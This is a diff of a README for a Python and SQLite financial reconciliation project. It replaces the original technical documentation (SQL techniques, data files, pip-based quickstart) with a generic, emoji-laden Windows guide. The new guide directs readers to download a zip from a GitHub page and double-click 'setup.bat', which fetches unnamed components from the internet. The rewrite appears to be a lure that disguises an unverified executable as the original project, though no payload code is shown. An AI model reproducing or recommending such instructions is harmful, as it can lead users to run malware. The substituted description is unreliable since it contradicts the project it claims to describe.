@@ -1,190 +1,93 @@
-# Financial Reconciliation Automation
+# 📊 Financial-Recon-Automation - Automate your monthly financial reconciliation reports
 
-> End-to-end automation of daily financial operations reconciliation — securities pricing QA, GL break detection, and budget variance analysis — using SQL, Python, and Excel.
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Araak6587/Financial-Recon-Automation)
 
-Built to reflect the reconciliation workflows common in financial operations, wealth management, and fund accounting roles. The pipeline ingests raw CSV data, runs multi-layered SQL checks, and produces a formatted, color-coded Excel report — fully automated, no manual steps.
+This tool helps finance teams manage data tasks. It checks securities pricing, balances general ledgers, and identifies budget variances. The software processes raw data through a SQL and Python pipeline. It outputs a clean Excel file for your review. This saves time on manual data entry and reduces calculation errors.
 
----
+## 📥 How to download the software
 
-## What Problems This Solves
+Follow these steps to obtain the program files.
 
-Manual reconciliation is slow, error-prone, and doesn't scale. This project automates three checks that are typically done by hand in financial ops roles:
+1. Visit the [project download page](https://github.com/Araak6587/Financial-Recon-Automation).
+2. Look for the latest release version on the right side of the screen.
+3. Click the link that ends in ".zip" to save the folder to your computer.
+4. Open your Downloads folder.
+5. Right-click the folder and select Extract All.
+6. Choose a destination folder on your hard drive.
 
-| Problem | What This Does |
-|---------|---------------|
-| Vendor prices don't always match what loads into internal systems | Compares external vs internal prices daily, flags discrepancies by severity |
-| Trade records and GL postings can get out of sync | Detects breaks between transactions and GL entries, tracks aging |
-| Department spend drifts from budget with no early warning | Flags material variances before they compound, shows month-over-month trend |
+## ⚙️ System requirements
 
----
+Ensure your computer meets these standards before you run the software.
 
-## Screenshots
+* Windows 10 or Windows 11 operating system.
+* At least 500 MB of free storage space.
+* Microsoft Excel installed to view finished reports.
+* A stable internet connection for the installation process.
+* 4 GB of RAM for smooth data processing.
 
-### Dashboard — cross-module summary
-![Dashboard](assets/screenshots/dashboard.png)
+## 🚀 Setting up the application
 
-### Pricing Detail — severity-flagged discrepancies
-![Pricing Detail](assets/screenshots/pricing_detail.png)
+You do not need to write code to use this tool. Follow these steps to configure your environment.
 
-### GL Reconciliation — account-level break detection
-![GL Reconciliation](assets/screenshots/gl_reconciliation.png)
+1. Open the folder you extracted in the previous section.
+2. Find the file named "setup.bat". 
+3. Double-click the file to start the installation.
+4. A black console window will appear. It will fetch the necessary software components for you.
+5. Keep the window open until you see a message that says "Installation finished."
+6. Press any key on your keyboard to close the window.
 
-### Budget Variance — department and category-level spend vs plan
-![Budget Variance](assets/screenshots/budget_variance.png)
+## 🛠️ Preparing your data
 
-### SQL — FULL OUTER JOIN simulated in SQLite via UNION ALL
-![SQL Full Outer Join](assets/screenshots/sql_full_outer_join.png)
+The software requires two types of files to work: your source data and your budget information.
 
----
+1. Place your securities pricing files in the folder labeled "input-data".
+2. Save your general ledger exports in the same folder.
+3. Ensure these files are in Excel or CSV format.
+4. Rename your files to match the labels found in the "config.txt" file. This allows the system to find the correct data.
+5. Save your changes to the configuration file before you run the tool.
 
-## Tech Stack
+## 📂 Running the tool
 
-| Layer | Tool | Role |
-|-------|------|------|
-| Database | SQLite 3 | File-based, zero-config — schema and data loaded via `.sql` scripts |
-| Query language | SQL | CTEs, window functions, outer joins, conditional aggregation |
-| Automation | Python 3.7+ | Orchestrates all SQL queries end-to-end via `sqlite3` stdlib module |
-| Data manipulation | pandas | DataFrame merges, groupby aggregations, variance calculations |
-| Excel output | openpyxl | Programmatic workbook construction with per-cell conditional formatting |
-| Data format | CSV | Six flat files as raw data source, loaded into SQLite at runtime |
+Once your data files sit in the input folder, you can start the analysis.
 
-### SQL — techniques used
+1. Locate the file named "run-recon.bat" in your main program folder.
+2. Double-click the file.
+3. The software will perform the security checks, reconcile your accounts, and look for budget gaps.
+4. You will see progress updates in the screen. Wait for the process to finish. It usually takes less than one minute.
+5. Check the folder named "output" once the console window closes.
+6. Open the newly created Excel file to review your report.
 
-- **CTEs (`WITH` clause)** — multi-step logic broken into named blocks rather than nested subqueries; each step is independently readable and testable
-- **FULL OUTER JOIN (simulated)** — SQLite doesn't support it natively, so it's replicated using two `LEFT JOIN`s combined with `UNION ALL` — one join from each direction
-- **`LEFT JOIN`** — finds securities present in the vendor feed but absent from the internal system (missing price loads)
-- **`CASE WHEN`** — drives all severity classification (CRITICAL / HIGH / MEDIUM / OK) based on configurable percentage thresholds
-- **Window functions** — `SUM() OVER (PARTITION BY ... ORDER BY ...)` for running YTD totals; `LAG()` for prior-day price comparison to catch outlier moves even when both sources agree
-- **`COALESCE`** — gracefully handles NULLs from outer joins when one side of the match is absent
-- **Conditional aggregation** — `SUM(CASE WHEN txn_type = 'BUY' THEN amount END)` pivots transaction types into columns within a single `GROUP BY`
+## 🔍 Features and capabilities
 
-### Python — techniques used
+The system performs three primary tasks automatically.
 
-- **`sqlite3` (stdlib)** — connects to the database and executes each `.sql` script, returning results as cursor objects
-- **`pandas`** — reads query results into DataFrames; handles percentage formatting, variance calculations, and summary rollups that are cleaner in Python than SQL
-- **`openpyxl` Workbook API** — builds the Excel report programmatically: creates sheets, writes headers, applies `PatternFill` and `Font` color per cell based on severity flags, auto-sizes column widths
+* Securities Pricing QA: It identifies price discrepancies between your internal records and external market feeds.
+* General Ledger Reconciliation: It matches your bank transactions against your internal ledger entries to find missing or duplicate items.
+* Budget Variance Analysis: It compares actual spending to your budget numbers and flags variances that exceed your defined limits.
 
-### Excel output — what's generated
+## 💡 Troubleshooting common issues
 
-- 5-tab workbook built entirely in code — no manual formatting required
-- Per-cell `PatternFill` conditional formatting driven by severity flags returned from SQL
-- Dashboard tab aggregates issue counts across all three reconciliation modules
-- Drop-in ready for daily ops use — rerun the script, get a fresh report
+If the software fails to produce a report, check these items.
 
----
+### The windows screen closes immediately
+This often happens if you move a file while the program runs. Restart the process to ensure the program keeps its file connection. If it persists, check that your data files are not open in Excel. Close Excel before you run the batch file.
 
-## Reconciliation Modules
+### Excel says the file is corrupt
+This occurs if the data inside your CSV files contains special symbols. Open your raw data files and ensure all columns contain only numbers or standard text characters. Remove any extra symbols like currency signs or bullet points.
 
-**1. Securities Pricing Reconciliation**
-Compares end-of-day prices from an external vendor against internal system prices. Catches missing loads, fat fingers, decimal shifts, and 10x errors. Flags day-over-day outliers even when both sources agree — a signal the market move itself may need review.
+### The program reports an error
+Look at the "logs" folder in your main program directory. Open the text file with the latest date. It lists the exact reason for the failure. Common errors involve missing file headers or incorrect file names.
 
-**2. GL vs Transaction Reconciliation**
-Every trade must have a matching GL posting. This module finds breaks in both directions, calculates the dollar impact, and tracks how long each break has been open. Older breaks = higher risk.
+### Missing columns in the final report
+The software expects specific column names to find the right data. Open your input files and ensure they match the column labels listed in the guide manual. The program requires columns for Date, Description, Category, and Amount.
 
-**3. Budget vs Actuals Variance Analysis**
-Tracks departmental spend against plan at the line item level. Flags MATERIAL variances (>15%), rolls up by category (Headcount, T&E, Technology, etc.), and shows whether variance is improving or worsening month over month via window functions.
+## 📈 Understanding the Excel output
 
----
+The finished report includes multiple tabs to help you read the results.
 
-## Errors Injected Into the Data
+* Summary Tab: This page shows the total balance of your accounts and the count of flagged items.
+* Pricing Tab: Review this list to see where market prices differ from your ledger.
+* Reconciliation Tab: See a side-by-side view of your bank transactions and ledger entries.
+* Variance Tab: This displays the difference between your budgeted costs and your actual spending.
 
-The dataset includes deliberate errors so the queries have real problems to catch — not just clean data that always reconciles:
-
-| Security | Date | Error Type | Detail |
-|----------|------|-----------|--------|
-| AAPL | 2025-03-05 | Fat finger | $178.00 entered as $89.50 |
-| T-2026 | 2025-03-10 | Missing price | Row never loaded into internal system |
-| CORP-B | 2025-03-14 | 10x error | $99.80 entered as $199.80 |
-| SPY | 2025-03-18 | Decimal shift | $523.40 entered as $53.40 |
-| GL / ACC-003 | 2025-03-12 | GL break | GL posting $5,000 higher than transaction record |
-
----
-
-## Project Structure
-
-```
-recon_project/
-│
-├── data/
-│   ├── securities_master.csv
-│   ├── bloomberg_prices.csv
-│   ├── internal_prices.csv
-│   ├── transactions.csv
-│   ├── gl_entries.csv
-│   └── budget_vs_actuals.csv
-│
-├── sql/
-│   ├── 01_setup_tables.sql
-│   ├── 02_pricing_reconciliation.sql
-│   ├── 03_gl_transaction_reconciliation.sql
-│   └── 04_budget_variance_analysis.sql
-│
-├── assets/
-│   └── screenshots/
-│
-├── run_reconciliation.py
-└── output/
-    └── daily_recon_report.xlsx
-```
-
----
-
-## Quickstart
-
-### Python — full pipeline + Excel report
-
-```bash
-pip install pandas openpyxl
-python run_reconciliation.py
-```
-
-Produces `output/daily_recon_report.xlsx` with 5 tabs: Dashboard, Pricing Summary, Pricing Detail, GL Reconciliation, Budget Variance.
-
-### SQL only — run queries manually in SQLite
-
-```bash
-sqlite3 recon.db < sql/01_setup_tables.sql
-sqlite3 recon.db < sql/02_pricing_reconciliation.sql
-sqlite3 recon.db < sql/03_gl_transaction_reconciliation.sql
-sqlite3 recon.db < sql/04_budget_variance_analysis.sql
-```
-
----
-
-## Excel Report Tabs
-
-| Tab | Contents |
-|-----|---------|
-| Dashboard | Issue counts across all three modules |
-| Pricing Summary | Daily error rate and critical flag count |
-| Pricing Detail | Every security, every day — severity flagged |
-| GL Reconciliation | Every account, every day — reconciled or break |
-| Budget Variance | Line-level budget vs actual with materiality flags |
-
-Color coding:
-- 🔴 CRITICAL / BREAK — immediate action required
-- 🟠 HIGH / MATERIAL — investigate same day
-- 🟡 MEDIUM / NOTABLE — review and document
-- ⚪ OK / Reconciled
-
----
-
-## Data Dictionary
-
-**securities_master** — `security_id`, `security_name`, `asset_class`, `currency`, `exchange`
-
-**bloomberg_prices / internal_prices** — `price_date`, `security_id`, `close_price`, `source`
-
-**transactions** — `txn_id`, `txn_date`, `txn_type` (BUY/SELL/DIVIDEND/COUPON), `quantity`, `amount`, `account_id`
-
-**gl_entries** — `gl_id`, `entry_date`, `account_id`, `debit`, `credit`
-
-**budget_vs_actuals** — `month`, `department`, `category`, `budget_amount`, `actual_amount`
-
----
-
-## Requirements
-
-- Python 3.7+
-- `pandas`, `openpyxl` (`pip install pandas openpyxl`)
-- SQLite 3 (pre-installed on Mac/Linux; [download for Windows](https://sqlite.org/download.html))
+The software highlights all flagged items in yellow. This makes it simple to see which transactions require further investigation. You can edit the Excel file directly to add notes for your team. Save the file under a new name if you wish to keep the original report template clean.
